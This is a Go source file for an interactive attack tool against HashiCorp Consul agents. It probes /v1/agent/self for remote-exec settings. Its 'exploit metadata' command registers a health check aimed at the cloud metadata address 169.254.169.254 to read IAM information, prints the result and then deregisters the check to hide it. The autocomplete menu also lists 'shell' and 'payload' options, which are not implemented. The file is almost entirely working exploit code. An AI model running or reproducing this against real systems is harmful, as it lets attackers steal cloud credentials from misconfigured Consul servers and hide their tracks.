package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/briandowns/spinner"
	"github.com/chzyer/readline"
	"github.com/gookit/color"
)

var target = ""

type vulnerable struct {
	Config struct {
		Datacenter string `json:"Datacenter"`
		NodeName   string `json:"NodeName"`
		NodeID     string `json:"NodeID"`
		Revision   string `json:"Revision"`
		Server     bool   `json:"Server"`
		Version    string `json:"Version"`
	} `json:"Config"`
	DebugConfig struct {
		ACLAgentMasterToken              string        `json:"ACLAgentMasterToken"`
		ACLAgentToken                    string        `json:"ACLAgentToken"`
		ACLDatacenter                    string        `json:"ACLDatacenter"`
		ACLDefaultPolicy                 string        `json:"ACLDefaultPolicy"`
		ACLDisabledTTL                   string        `json:"ACLDisabledTTL"`
		ACLDownPolicy                    string        `json:"ACLDownPolicy"`
		ACLEnableKeyListPolicy           bool          `json:"ACLEnableKeyListPolicy"`
		ACLEnableTokenPersistence        bool          `json:"ACLEnableTokenPersistence"`
		ACLEnforceVersion8               bool          `json:"ACLEnforceVersion8"`
		ACLMasterToken                   string        `json:"ACLMasterToken"`
		ACLPolicyTTL                     string        `json:"ACLPolicyTTL"`
		ACLReplicationToken              string        `json:"ACLReplicationToken"`
		ACLRoleTTL                       string        `json:"ACLRoleTTL"`
		ACLToken                         string        `json:"ACLToken"`
		ACLTokenReplication              bool          `json:"ACLTokenReplication"`
		ACLTokenTTL                      string        `json:"ACLTokenTTL"`
		ACLsEnabled                      bool          `json:"ACLsEnabled"`
		AEInterval                       string        `json:"AEInterval"`
		AdvertiseAddrLAN                 string        `json:"AdvertiseAddrLAN"`
		AdvertiseAddrWAN                 string        `json:"AdvertiseAddrWAN"`
		AllowWriteHTTPFrom               []interface{} `json:"AllowWriteHTTPFrom"`
		AutoEncryptAllowTLS              bool          `json:"AutoEncryptAllowTLS"`
		AutoEncryptTLS                   bool          `json:"AutoEncryptTLS"`
		AutopilotCleanupDeadServers      bool          `json:"AutopilotCleanupDeadServers"`
		AutopilotDisableUpgradeMigration bool          `json:"AutopilotDisableUpgradeMigration"`
		AutopilotLastContactThreshold    string        `json:"AutopilotLastContactThreshold"`
		AutopilotMaxTrailingLogs         int           `json:"AutopilotMaxTrailingLogs"`
		AutopilotMinQuorum               int           `json:"AutopilotMinQuorum"`
		AutopilotRedundancyZoneTag       string        `json:"AutopilotRedundancyZoneTag"`
		AutopilotServerStabilizationTime string        `json:"AutopilotServerStabilizationTime"`
		AutopilotUpgradeVersionTag       string        `json:"AutopilotUpgradeVersionTag"`
		BindAddr                         string        `json:"BindAddr"`
		Bootstrap                        bool          `json:"Bootstrap"`
		BootstrapExpect                  int           `json:"BootstrapExpect"`
		CAFile                           string        `json:"CAFile"`
		CAPath                           string        `json:"CAPath"`
		CertFile                         string        `json:"CertFile"`
		CheckDeregisterIntervalMin       string        `json:"CheckDeregisterIntervalMin"`
		CheckOutputMaxSize               int           `json:"CheckOutputMaxSize"`
		CheckReapInterval                string        `json:"CheckReapInterval"`
		CheckUpdateInterval              string        `json:"CheckUpdateInterval"`
		Checks                           []interface{} `json:"Checks"`
		ClientAddrs                      []string      `json:"ClientAddrs"`
		ConfigEntryBootstrap             []interface{} `json:"ConfigEntryBootstrap"`
		ConnectCAConfig                  struct {
		} `json:"ConnectCAConfig"`
		ConnectCAProvider                 string        `json:"ConnectCAProvider"`
		ConnectEnabled                    bool          `json:"ConnectEnabled"`
		ConnectSidecarMaxPort             int           `json:"ConnectSidecarMaxPort"`
		ConnectSidecarMinPort             int           `json:"ConnectSidecarMinPort"`
		ConnectTestCALeafRootChangeSpread string        `json:"ConnectTestCALeafRootChangeSpread"`
		ConsulCoordinateUpdateBatchSize   int           `json:"ConsulCoordinateUpdateBatchSize"`
		ConsulCoordinateUpdateMaxBatches  int           `json:"ConsulCoordinateUpdateMaxBatches"`
		ConsulCoordinateUpdatePeriod      string        `json:"ConsulCoordinateUpdatePeriod"`
		ConsulRaftElectionTimeout         string        `json:"ConsulRaftElectionTimeout"`
		ConsulRaftHeartbeatTimeout        string        `json:"ConsulRaftHeartbeatTimeout"`
		ConsulRaftLeaderLeaseTimeout      string        `json:"ConsulRaftLeaderLeaseTimeout"`
		ConsulServerHealthInterval        string        `json:"ConsulServerHealthInterval"`
		DNSARecordLimit                   int           `json:"DNSARecordLimit"`
		DNSAddrs                          []string      `json:"DNSAddrs"`
		DNSAllowStale                     bool          `json:"DNSAllowStale"`
		DNSAltDomain                      string        `json:"DNSAltDomain"`
		DNSCacheMaxAge                    string        `json:"DNSCacheMaxAge"`
		DNSDisableCompression             bool          `json:"DNSDisableCompression"`
		DNSDomain                         string        `json:"DNSDomain"`
		DNSEnableTruncate                 bool          `json:"DNSEnableTruncate"`
		DNSMaxStale                       string        `json:"DNSMaxStale"`
		DNSNodeMetaTXT                    bool          `json:"DNSNodeMetaTXT"`
		DNSNodeTTL                        string        `json:"DNSNodeTTL"`
		DNSOnlyPassing                    bool          `json:"DNSOnlyPassing"`
		DNSPort                           int           `json:"DNSPort"`
		DNSRecursorTimeout                string        `json:"DNSRecursorTimeout"`
		DNSRecursors                      []interface{} `json:"DNSRecursors"`
		DNSSOA                            struct {
			Expire  int `json:"Expire"`
			Minttl  int `json:"Minttl"`
			Refresh int `json:"Refresh"`
			Retry   int `json:"Retry"`
		} `json:"DNSSOA"`
		DNSServiceTTL struct {
		} `json:"DNSServiceTTL"`
		DNSUDPAnswerLimit                int           `json:"DNSUDPAnswerLimit"`
		DNSUseCache                      bool          `json:"DNSUseCache"`
		DataDir                          string        `json:"DataDir"`
		Datacenter                       string        `json:"Datacenter"`
		DevMode                          bool          `json:"DevMode"`
		DisableAnonymousSignature        bool          `json:"DisableAnonymousSignature"`
		DisableCoordinates               bool          `json:"DisableCoordinates"`
		DisableHTTPUnprintableCharFilter bool          `json:"DisableHTTPUnprintableCharFilter"`
		DisableHostNodeID                bool          `json:"DisableHostNodeID"`
		DisableKeyringFile               bool          `json:"DisableKeyringFile"`
		DisableRemoteExec                bool          `json:"DisableRemoteExec"`
		DisableUpdateCheck               bool          `json:"DisableUpdateCheck"`
		DiscardCheckOutput               bool          `json:"DiscardCheckOutput"`
		DiscoveryMaxStale                string        `json:"DiscoveryMaxStale"`
		EnableAgentTLSForChecks          bool          `json:"EnableAgentTLSForChecks"`
		EnableCentralServiceConfig       bool          `json:"EnableCentralServiceConfig"`
		EnableDebug                      bool          `json:"EnableDebug"`
		EnableLocalScriptChecks          bool          `json:"EnableLocalScriptChecks"`
		EnableRemoteScriptChecks         bool          `json:"EnableRemoteScriptChecks"`
		EnableSyslog                     bool          `json:"EnableSyslog"`
		EnableUI                         bool          `json:"EnableUI"`
		EncryptKey                       string        `json:"EncryptKey"`
		EncryptVerifyIncoming            bool          `json:"EncryptVerifyIncoming"`
		EncryptVerifyOutgoing            bool          `json:"EncryptVerifyOutgoing"`
		ExposeMaxPort                    int           `json:"ExposeMaxPort"`
		ExposeMinPort                    int           `json:"ExposeMinPort"`
		GRPCAddrs                        []interface{} `json:"GRPCAddrs"`
		GRPCPort                         int           `json:"GRPCPort"`
		GossipLANGossipInterval          string        `json:"GossipLANGossipInterval"`
		GossipLANGossipNodes             int           `json:"GossipLANGossipNodes"`
		GossipLANProbeInterval           string        `json:"GossipLANProbeInterval"`
		GossipLANProbeTimeout            string        `json:"GossipLANProbeTimeout"`
		GossipLANRetransmitMult          int           `json:"GossipLANRetransmitMult"`
		GossipLANSuspicionMult           int           `json:"GossipLANSuspicionMult"`
		GossipWANGossipInterval          string        `json:"GossipWANGossipInterval"`
		GossipWANGossipNodes             int           `json:"GossipWANGossipNodes"`
		GossipWANProbeInterval           string        `json:"GossipWANProbeInterval"`
		GossipWANProbeTimeout            string        `json:"GossipWANProbeTimeout"`
		GossipWANRetransmitMult          int           `json:"GossipWANRetransmitMult"`
		GossipWANSuspicionMult           int           `json:"GossipWANSuspicionMult"`
		HTTPAddrs                        []string      `json:"HTTPAddrs"`
		HTTPBlockEndpoints               []interface{} `json:"HTTPBlockEndpoints"`
		HTTPMaxConnsPerClient            int           `json:"HTTPMaxConnsPerClient"`
		HTTPPort                         int           `json:"HTTPPort"`
		HTTPResponseHeaders              struct {
		} `json:"HTTPResponseHeaders"`
		HTTPSAddrs            []interface{} `json:"HTTPSAddrs"`
		HTTPSHandshakeTimeout string        `json:"HTTPSHandshakeTimeout"`
		HTTPSPort             int           `json:"HTTPSPort"`
		KVMaxValueSize        int           `json:"KVMaxValueSize"`
		KeyFile               string        `json:"KeyFile"`
		LeaveDrainTime        string        `json:"LeaveDrainTime"`
		LeaveOnTerm           bool          `json:"LeaveOnTerm"`
		LogFile               string        `json:"LogFile"`
		LogLevel              string        `json:"LogLevel"`
		LogRotateBytes        int           `json:"LogRotateBytes"`
		LogRotateDuration     string        `json:"LogRotateDuration"`
		LogRotateMaxFiles     int           `json:"LogRotateMaxFiles"`
		NodeID                string        `json:"NodeID"`
		NodeMeta              struct {
		} `json:"NodeMeta"`
		NodeName                    string        `json:"NodeName"`
		NonVotingServer             bool          `json:"NonVotingServer"`
		PidFile                     string        `json:"PidFile"`
		PrimaryDatacenter           string        `json:"PrimaryDatacenter"`
		RPCAdvertiseAddr            string        `json:"RPCAdvertiseAddr"`
		RPCBindAddr                 string        `json:"RPCBindAddr"`
		RPCHandshakeTimeout         string        `json:"RPCHandshakeTimeout"`
		RPCHoldTimeout              string        `json:"RPCHoldTimeout"`
		RPCMaxBurst                 int           `json:"RPCMaxBurst"`
		RPCMaxConnsPerClient        int           `json:"RPCMaxConnsPerClient"`
		RPCProtocol                 int           `json:"RPCProtocol"`
		RPCRateLimit                int           `json:"RPCRateLimit"`
		RaftProtocol                int           `json:"RaftProtocol"`
		RaftSnapshotInterval        string        `json:"RaftSnapshotInterval"`
		RaftSnapshotThreshold       int           `json:"RaftSnapshotThreshold"`
		RaftTrailingLogs            int           `json:"RaftTrailingLogs"`
		ReconnectTimeoutLAN         string        `json:"ReconnectTimeoutLAN"`
		ReconnectTimeoutWAN         string        `json:"ReconnectTimeoutWAN"`
		RejoinAfterLeave            bool          `json:"RejoinAfterLeave"`
		RetryJoinIntervalLAN        string        `json:"RetryJoinIntervalLAN"`
		RetryJoinIntervalWAN        string        `json:"RetryJoinIntervalWAN"`
		RetryJoinLAN                []string      `json:"RetryJoinLAN"`
		RetryJoinMaxAttemptsLAN     int           `json:"RetryJoinMaxAttemptsLAN"`
		RetryJoinMaxAttemptsWAN     int           `json:"RetryJoinMaxAttemptsWAN"`
		RetryJoinWAN                []interface{} `json:"RetryJoinWAN"`
		Revision                    string        `json:"Revision"`
		SegmentLimit                int           `json:"SegmentLimit"`
		SegmentName                 string        `json:"SegmentName"`
		SegmentNameLimit            int           `json:"SegmentNameLimit"`
		Segments                    []interface{} `json:"Segments"`
		SerfAdvertiseAddrLAN        string        `json:"SerfAdvertiseAddrLAN"`
		SerfAdvertiseAddrWAN        string        `json:"SerfAdvertiseAddrWAN"`
		SerfBindAddrLAN             string        `json:"SerfBindAddrLAN"`
		SerfBindAddrWAN             string        `json:"SerfBindAddrWAN"`
		SerfPortLAN                 int           `json:"SerfPortLAN"`
		SerfPortWAN                 int           `json:"SerfPortWAN"`
		ServerMode                  bool          `json:"ServerMode"`
		ServerName                  string        `json:"ServerName"`
		ServerPort                  int           `json:"ServerPort"`
		Services                    []interface{} `json:"Services"`
		SessionTTLMin               string        `json:"SessionTTLMin"`
		SkipLeaveOnInt              bool          `json:"SkipLeaveOnInt"`
		StartJoinAddrsLAN           []interface{} `json:"StartJoinAddrsLAN"`
		StartJoinAddrsWAN           []interface{} `json:"StartJoinAddrsWAN"`
		SyncCoordinateIntervalMin   string        `json:"SyncCoordinateIntervalMin"`
		SyncCoordinateRateTarget    int           `json:"SyncCoordinateRateTarget"`
		SyslogFacility              string        `json:"SyslogFacility"`
		TLSCipherSuites             []interface{} `json:"TLSCipherSuites"`
		TLSMinVersion               string        `json:"TLSMinVersion"`
		TLSPreferServerCipherSuites bool          `json:"TLSPreferServerCipherSuites"`
		TaggedAddresses             struct {
			Lan string `json:"lan"`
			Wan string `json:"wan"`
		} `json:"TaggedAddresses"`
		Telemetry struct {
			AllowedPrefixes                    []interface{} `json:"AllowedPrefixes"`
			BlockedPrefixes                    []interface{} `json:"BlockedPrefixes"`
			CirconusAPIApp                     string        `json:"CirconusAPIApp"`
			CirconusAPIToken                   string        `json:"CirconusAPIToken"`
			CirconusAPIURL                     string        `json:"CirconusAPIURL"`
			CirconusBrokerID                   string        `json:"CirconusBrokerID"`
			CirconusBrokerSelectTag            string        `json:"CirconusBrokerSelectTag"`
			CirconusCheckDisplayName           string        `json:"CirconusCheckDisplayName"`
			CirconusCheckForceMetricActivation string        `json:"CirconusCheckForceMetricActivation"`
			CirconusCheckID                    string        `json:"CirconusCheckID"`
			CirconusCheckInstanceID            string        `json:"CirconusCheckInstanceID"`
			CirconusCheckSearchTag             string        `json:"CirconusCheckSearchTag"`
			CirconusCheckTags                  string        `json:"CirconusCheckTags"`
			CirconusSubmissionInterval         string        `json:"CirconusSubmissionInterval"`
			CirconusSubmissionURL              string        `json:"CirconusSubmissionURL"`
			DisableHostname                    bool          `json:"DisableHostname"`
			DogstatsdAddr                      string        `json:"DogstatsdAddr"`
			DogstatsdTags                      []interface{} `json:"DogstatsdTags"`
			FilterDefault                      bool          `json:"FilterDefault"`
			MetricsPrefix                      string        `json:"MetricsPrefix"`
			PrometheusRetentionTime            string        `json:"PrometheusRetentionTime"`
			StatsdAddr                         string        `json:"StatsdAddr"`
			StatsiteAddr                       string        `json:"StatsiteAddr"`
		} `json:"Telemetry"`
		TranslateWANAddrs    bool          `json:"TranslateWANAddrs"`
		UIContentPath        string        `json:"UIContentPath"`
		UIDir                string        `json:"UIDir"`
		UnixSocketGroup      string        `json:"UnixSocketGroup"`
		UnixSocketMode       string        `json:"UnixSocketMode"`
		UnixSocketUser       string        `json:"UnixSocketUser"`
		VerifyIncoming       bool          `json:"VerifyIncoming"`
		VerifyIncomingHTTPS  bool          `json:"VerifyIncomingHTTPS"`
		VerifyIncomingRPC    bool          `json:"VerifyIncomingRPC"`
		VerifyOutgoing       bool          `json:"VerifyOutgoing"`
		VerifyServerHostname bool          `json:"VerifyServerHostname"`
		Version              string        `json:"Version"`
		VersionPrerelease    string        `json:"VersionPrerelease"`
		Watches              []interface{} `json:"Watches"`
	} `json:"DebugConfig"`
	Coord struct {
		Vec        []float64 `json:"Vec"`
		Error      float64   `json:"Error"`
		Adjustment float64   `json:"Adjustment"`
		Height     float64   `json:"Height"`
	} `json:"Coord"`
	Member struct {
		Name string `json:"Name"`
		Addr string `json:"Addr"`
		Port int    `json:"Port"`
		Tags struct {
			Acls        string `json:"acls"`
			Build       string `json:"build"`
			Dc          string `json:"dc"`
			Expect      string `json:"expect"`
			ID          string `json:"id"`
			Port        string `json:"port"`
			RaftVsn     string `json:"raft_vsn"`
			Role        string `json:"role"`
			Segment     string `json:"segment"`
			Vsn         string `json:"vsn"`
			VsnMax      string `json:"vsn_max"`
			VsnMin      string `json:"vsn_min"`
			WanJoinPort string `json:"wan_join_port"`
		} `json:"Tags"`
		Status      int `json:"Status"`
		ProtocolMin int `json:"ProtocolMin"`
		ProtocolMax int `json:"ProtocolMax"`
		ProtocolCur int `json:"ProtocolCur"`
		DelegateMin int `json:"DelegateMin"`
		DelegateMax int `json:"DelegateMax"`
		DelegateCur int `json:"DelegateCur"`
	} `json:"Member"`
	Stats struct {
		Agent struct {
			CheckMonitors string `json:"check_monitors"`
			CheckTtls     string `json:"check_ttls"`
			Checks        string `json:"checks"`
			Services      string `json:"services"`
		} `json:"agent"`
		Build struct {
			Prerelease string `json:"prerelease"`
			Revision   string `json:"revision"`
			Version    string `json:"version"`
		} `json:"build"`
		Consul struct {
			ACL              string `json:"acl"`
			Bootstrap        string `json:"bootstrap"`
			KnownDatacenters string `json:"known_datacenters"`
			Leader           string `json:"leader"`
			LeaderAddr       string `json:"leader_addr"`
			Server           string `json:"server"`
		} `json:"consul"`
		License struct {
			Customer       string `json:"customer"`
			ExpirationTime string `json:"expiration_time"`
			Features       string `json:"features"`
			ID             string `json:"id"`
			InstallID      string `json:"install_id"`
			IssueTime      string `json:"issue_time"`
			Product        string `json:"product"`
			StartTime      string `json:"start_time"`
		} `json:"license"`
		Raft struct {
			AppliedIndex             string `json:"applied_index"`
			CommitIndex              string `json:"commit_index"`
			FsmPending               string `json:"fsm_pending"`
			LastContact              string `json:"last_contact"`
			LastLogIndex             string `json:"last_log_index"`
			LastLogTerm              string `json:"last_log_term"`
			LastSnapshotIndex        string `json:"last_snapshot_index"`
			LastSnapshotTerm         string `json:"last_snapshot_term"`
			LatestConfiguration      string `json:"latest_configuration"`
			LatestConfigurationIndex string `json:"latest_configuration_index"`
			NumPeers                 string `json:"num_peers"`
			ProtocolVersion          string `json:"protocol_version"`
			ProtocolVersionMax       string `json:"protocol_version_max"`
			ProtocolVersionMin       string `json:"protocol_version_min"`
			SnapshotVersionMax       string `json:"snapshot_version_max"`
			SnapshotVersionMin       string `json:"snapshot_version_min"`
			State                    string `json:"state"`
			Term                     string `json:"term"`
		} `json:"raft"`
		Runtime struct {
			Arch       string `json:"arch"`
			CPUCount   string `json:"cpu_count"`
			Goroutines string `json:"goroutines"`
			MaxProcs   string `json:"max_procs"`
			Os         string `json:"os"`
			Version    string `json:"version"`
		} `json:"runtime"`
		SerfLan struct {
			CoordinateResets string `json:"coordinate_resets"`
			Encrypted        string `json:"encrypted"`
			EventQueue       string `json:"event_queue"`
			EventTime        string `json:"event_time"`
			Failed           string `json:"failed"`
			HealthScore      string `json:"health_score"`
			IntentQueue      string `json:"intent_queue"`
			Left             string `json:"left"`
			MemberTime       string `json:"member_time"`
			Members          string `json:"members"`
			QueryQueue       string `json:"query_queue"`
			QueryTime        string `json:"query_time"`
		} `json:"serf_lan"`
		SerfWan struct {
			CoordinateResets string `json:"coordinate_resets"`
			Encrypted        string `json:"encrypted"`
			EventQueue       string `json:"event_queue"`
			EventTime        string `json:"event_time"`
			Failed           string `json:"failed"`
			HealthScore      string `json:"health_score"`
			IntentQueue      string `json:"intent_queue"`
			Left             string `json:"left"`
			MemberTime       string `json:"member_time"`
			Members          string `json:"members"`
			QueryQueue       string `json:"query_queue"`
			QueryTime        string `json:"query_time"`
		} `json:"serf_wan"`
	} `json:"Stats"`
	Meta struct {
		ConsulNetworkSegment string `json:"consul-network-segment"`
	} `json:"Meta"`
}

type CheckOutput struct {
	TEST struct {
		Node        string        `json:"Node"`
		CheckID     string        `json:"CheckID"`
		Name        string        `json:"Name"`
		Status      string        `json:"Status"`
		Notes       string        `json:"Notes"`
		Output      string        `json:"Output"`
		ServiceID   string        `json:"ServiceID"`
		ServiceName string        `json:"ServiceName"`
		ServiceTags []interface{} `json:"ServiceTags"`
		Type        string        `json:"Type"`
		Definition  struct {
		} `json:"Definition"`
		CreateIndex int `json:"CreateIndex"`
		ModifyIndex int `json:"ModifyIndex"`
	} `json:"Test"`
}

type Check struct {
	ID            string `json:"id"`
	Name          string `json:"name"`
	HTTP          string `json:"http"`
	TLSSkipVerify bool   `json:"tls_skip_verify"`
	Method        string `json:"method"`
	Header        struct {
		ContentType []string `json:"Content-Type"`
	} `json:"header"`
	Body     string `json:"body"`
	Interval string `json:"interval"`
	Timeout  string `json:"timeout"`
}

func main() {
	start()
}

func start() {

	red := color.FgRed.Render
	blue := color.FgBlue.Render
	green := color.FgGreen.Render
	fmt.Println("Not Connected: " + red(target))
	ascii := `

___.               .___.__                  .__    .__ 
\_ |__ _____     __| _/|  |__ _____    _____|  |__ |__|
 | __ \\__  \   / __ | |  |  \\__  \  /  ___/  |  \|  |
 | \_\ \/ __ \_/ /_/ | |   Y  \/ __ \_\___ \|   Y  \  |
 |___  (____  /\____ | |___|  (____  /____  >___|  /__|
     \/     \/      \/      \/     \/     \/     \/      by grines`
	print(ascii + "\n")

	for {
		var completer = readline.NewPrefixCompleter(
			readline.PcItem("target"),
			readline.PcItem("check",
				readline.PcItem("status"),
			),
			readline.PcItem("exploit",
				readline.PcItem("metadata"),
				readline.PcItem("shell"),
				readline.PcItem("payload"),
			),
		)
		l, err := readline.NewEx(&readline.Config{
			Prompt:          "\033[31m»\033[0m ",
			HistoryFile:     "/tmp/readline.tmp",
			AutoComplete:    completer,
			InterruptPrompt: "^C",
			EOFPrompt:       "exit",

			HistorySearchFold:   true,
			FuncFilterInputRune: filterInput,
		})
		if err != nil {
			panic(err)
		}
		defer l.Close()

		log.SetOutput(l.Stderr())
		if target == "" {
			l.SetPrompt(red("Not Connected") + " <" + blue(target) + "> ")
		} else {
			l.SetPrompt(green("Connected") + " <" + blue(target) + "> ")
		}
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "target "):
			parts := strings.Split(line, " ")
			target = parts[1]
		case strings.HasPrefix(line, "check status"):
			getStatus(target)
		case strings.HasPrefix(line, "exploit metadata"):
			getMeta(target)
		case line == "login":
			pswd, err := l.ReadPassword("please enter your password: ")
			if err != nil {
				break
			}
			println("you enter:", strconv.Quote(string(pswd)))
		case line == "history":
			dat, err := ioutil.ReadFile("/tmp/readline.tmp")
			if err != nil {
				break
			}
			fmt.Print(string(dat))
		case line == "bye":
			goto exit
		case line == "sleep":
			log.Println("sleep 4 second")
			time.Sleep(4 * time.Second)
		default:
			cmdString := line
			if cmdString == "exit" {
				os.Exit(1)
			}
		}
	}
exit:
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

func getStatus(url string) (bool, error) {

	url = url + "/v1/agent/self"

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("err:", err)
		return false, err
	}
	defer resp.Body.Close()

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		fmt.Println(readErr)
		return false, err
	}

	var results vulnerable
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		fmt.Println(jsonErr)
		return false, err
	}

	fmt.Printf("DisableRemoteExec: %v\n", results.DebugConfig.DisableRemoteExec)
	fmt.Printf("EnableRemoteScriptChecks: %v\n", results.DebugConfig.EnableRemoteScriptChecks)
	fmt.Printf("NodeName: %v\n", results.Config.NodeName)
	fmt.Printf("Version: %v\n", results.Config.Version)
	fmt.Printf("Server: %v\n", results.Config.Server)
	return false, err
}

func getMeta(base string) {

	urls := base + "/v1/agent/check/register"

	checks := Check{
		ID:            "Test",
		Name:          "This is a test",
		HTTP:          "http://169.254.169.254/latest/meta-data/iam/info",
		TLSSkipVerify: false,
		Method:        "GET",
		Body:          "",
		Interval:      "10s",
		Timeout:       "1s",
	}

	// initialize http client
	client := &http.Client{}

	// marshal User to json
	json, err := json.Marshal(checks)
	if err != nil {
		panic(err)
	}

	// set the HTTP method, url, and request body
	req, err := http.NewRequest(http.MethodPut, urls, bytes.NewBuffer(json))
	if err != nil {
		panic(err)
	}

	// set the request header Content-Type for json
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	if resp.StatusCode == 200 {
		fmt.Println("----")
		fmt.Println("Check Registered")
		fmt.Println("Waiting for command to register...")
		s := spinner.New(spinner.CharSets[9], 100*time.Millisecond) // Build our new spinner
		s.Start()                                                   // Start the spinner
		time.Sleep(20 * time.Second)                                // Run for some time to simulate work
		s.Stop()
		getHTTPOutput(base)
		deregisterCheck(base)

	}
}

func deregisterCheck(base string) {

	urls := base + "/v1/agent/check/deregister/Test"

	checks := Check{
		ID: "Test",
	}

	// initialize http client
	client := &http.Client{}

	// marshal User to json
	json, err := json.Marshal(checks)
	if err != nil {
		panic(err)
	}

	// set the HTTP method, url, and request body
	req, err := http.NewRequest(http.MethodPut, urls, bytes.NewBuffer(json))
	if err != nil {
		panic(err)
	}

	// set the request header Content-Type for json
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	if resp.StatusCode == 200 {
		fmt.Println("Check Deregistered")
		fmt.Println("---")
	} else {
		fmt.Println("Oops..")
	}
}

func getHTTPOutput(url string) (bool, error) {
	red := color.FgRed.Render

	url = url + "/v1/agent/checks?filter=CheckID%20==%20\"Test\""

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("err:", err)
		return false, err
	}
	defer resp.Body.Close()

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		fmt.Println(readErr)
		return false, err
	}

	var results CheckOutput
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		fmt.Println(jsonErr)
		return false, err
	}

	fmt.Printf("ID: %v\n", results.TEST.CheckID)
	fmt.Printf("%v\n", red(results.TEST.Output))
	return false, err
}
